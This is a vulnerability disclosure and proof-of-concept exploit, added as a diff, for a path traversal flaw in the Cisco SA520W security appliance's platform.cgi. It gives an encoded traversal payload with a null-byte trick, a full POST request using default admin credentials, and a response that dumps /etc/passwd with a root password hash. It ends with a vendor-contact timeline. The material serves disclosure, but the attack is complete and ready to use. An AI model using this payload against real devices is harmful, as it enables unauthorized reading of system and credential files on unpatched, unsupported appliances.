@@ -1,0 +1,55 @@
+# Title: Cisco SA520W Security Appliance - Path Traversal
+# Author: Nassim Asrir
+# Contact: wassline@gmail.com / https://www.linkedin.com/in/nassim-asrir-b73a57122/
+# Vendor: https://www.cisco.com/
+# About Product:
+===============
+Cisco SA 500 Series Security Appliances are designed for businesses with fewer than 100 employees. 
+They combine firewall, VPN, and optional intrusion prevention system (IPS), email, and web security capabilities. Whether in the office or working remotely, your employees can securely access the resources they need, while your business is protected from unauthorized access and Internet threats.
+
+# POC
+====================
+
+//In our poc we will try to read /etc/passwd
+
+The vulnerable Parameter: thispage
+
+payload: ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm
+
+Request Type: POST
+
+Request:
+=======
+
+POST /scgi-bin/platform.cgi HTTP/1.1
+Host: host-ip
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://70.186.255.169/scgi-bin/platform.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 311
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+thispage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm&SSLVPNUser.UserName=admin&SSLVPNUser.Password=admin&button.login.routerStatus=Log+In&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A58.0%29+Gecko%2F20100101+Firefox%2F58.0
+
+Response:
+========
+
+HTTP/1.0 200 OK
+Date: Sat, 01 Jan 2000 00:00:41 GMT
+Server: Embedded HTTP Server.
+Connection: close
+root:$1$omdZQoH8$bFOOjhl.E7BKKzvW/bRJe0:0:0:root:/:/bin/sh
+nobody:x:0:0:nobody:/nonexistent:/bin/false
+
+#Timeline:
+=========
+	
+18 Apr 2018 : First Contact with Cisco.
+18 Apr 2018 : Cisco Ask me for more details about the vulnerability.
+18 Apr 2018 : Details sent to Cisco
+19 Apr 2018 : Ask for update
+15 May 2018 : Cisco say "The product you reference went end of support in April 2016 No further action will be taken."
+18 May 2018 : Public Disclosure
